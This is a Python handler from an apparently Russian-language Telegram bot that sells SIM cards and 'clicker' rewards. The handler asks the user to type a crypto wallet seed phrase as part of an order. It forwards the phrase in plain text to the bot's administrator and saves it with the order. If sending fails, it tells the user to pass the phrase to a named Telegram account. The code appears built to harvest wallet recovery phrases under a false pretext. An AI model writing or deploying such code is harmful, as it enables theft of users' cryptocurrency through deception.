async def handle_sim_seed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    seed_text = update.message.text
    
    current_order = context.user_data.get("current_order")
    
    if not current_order:
        await update.message.reply_text("❌ Нет активного заказа")
        return ConversationHandler.END
    
    order_type = "Кликер" if current_order['type'] == 'clicker_reward' else "Покупка"
    operator = current_order['operator']
    
    admin_msg = (
        f"📱 **ЗАКАЗ**\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"👤 {update.effective_user.first_name}\n"
        f"🆔 {user_id}\n"
        f"📦 {order_type}\n"
        f"📱 {operator['emoji']} {operator['name']}\n"
        f"🔢 {current_order['quantity']} шт\n"
        f"📝 Сид-фраза:\n`{seed_text}`"
    )
    
    admin_notified = False
    
    if ADMIN_ID:
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown')
            admin_notified = True
        except:
            pass
    
    if admin_notified:
        await update.message.reply_text("✅ Данные отправлены администратору!")
    else:
        await update.message.reply_text(
            f"❌ Ошибка отправки. Сохрани данные:\n`{seed_text}`\n\nОтправь @YungTrezinny",
            parse_mode='Markdown'
        )
    
    if 'orders' in context.user_data:
        for order in context.user_data['orders']:
            if order.get("id") == current_order.get("id"):
                order["status"] = "completed" if admin_notified else "error"
                order["seed"] = seed_text
                break
    
    keys_to_clear = ["current_order", "sim_temp", "sim_quantity", "sim_operator", "clicker_reward"]
    for key in keys_to_clear:
        context.user_data.pop(key, None)
    
    await show_main_menu(update, context)
    return ConversationHandler.END

